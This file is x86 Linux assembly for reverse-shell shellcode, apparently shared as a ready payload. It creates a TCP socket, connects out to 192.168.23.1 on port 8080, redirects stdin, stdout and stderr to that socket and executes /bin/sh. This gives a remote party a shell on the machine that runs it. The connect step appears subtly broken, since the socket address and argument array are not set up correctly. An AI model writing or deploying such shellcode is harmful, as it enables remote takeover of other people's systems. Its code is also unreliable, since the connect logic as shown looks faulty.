
# Author : superdk@hanmail.net
# DATA : reverse shellcode
# LICENSE : GNU License

 
.globl _start

_start:
	# sockfd = socket(AF_INET-2, SOCK_STREAM-1, IPPROTO_TCP-6);
	xor %eax, %eax
	xor %ebx, %ebx
	xor %ecx, %ecx
	push %ecx
	
	# IPPROTO_TCP /usr/src/linux-2.2.14/include/linux/in.h
	movb $6, %cl
	push %ecx
	
	# SOCK_STREAM /usr/src/linux-2.2.14/include/asm-i386/socket.h
	movb $1, %cl
	push %ecx
	
	# AF_INET /usr/include/linux/socket.h
	movb $2, %cl
	push %ecx
	movl %esp, %ecx
	
	# SYS_SOCKET /usr/include/linux/net.h
	movb $1, %bl
	
	# SYS_socketcall /usr/src/linux-2.2.14/include/asm-i386/unistd.h
	movb $102, %al
	int $0x80
	
	# connect(sockfd, sockaddr, 16)
	movl %eax, %edx
	xor %eax, %eax
	xor %ecx, %ecx
	push %ecx
	push %ecx
	push $0x117a8c0 # ip address 192.168.23.1
	pushw $0x901f # port 8080
	movb $0x02, %cl # address family
	
	# SYS_CONNECT /usr/include/linux/net.h
	movb $3, %bl
	
	# SYS_socketcall /usr/src/linux-2.2.14/include/asm-i386/unistd.h
	movb $102, %al
	int $0x80
	
	# dup2(sock, 0);
	xor %eax, %eax
	movb $63, %al # SYS_dup2
	movl %edx, %ebx # sock
	xor %ecx, %ecx
	int $0x80
	
	# dup2(sock, 1);
	xor %eax, %eax
	movb $63, %al # SYS_dup2
	movl %edx, %ebx # sock
	movb $1, %cl # stdout
	int $0x80
	
	# dup2(sock, 2);
	xor %eax, %eax
	movb $63, %al # SYS_dup2
	movl %edx, %ebx # sock
	movb $2, %cl # stderr
	int $0x80
	
	# execve("/bin/sh", &[/bin/sh], NULL);
	xor %eax, %eax
	xor %edx, %edx
	movb $11, %al
	push %edx
	push $0x68732f2f #//sh
	push $0x6e69622f #/bin
	mov %esp, %ebx
	push %edx
	push %ebx
	mov %esp, %ecx
	int $0x80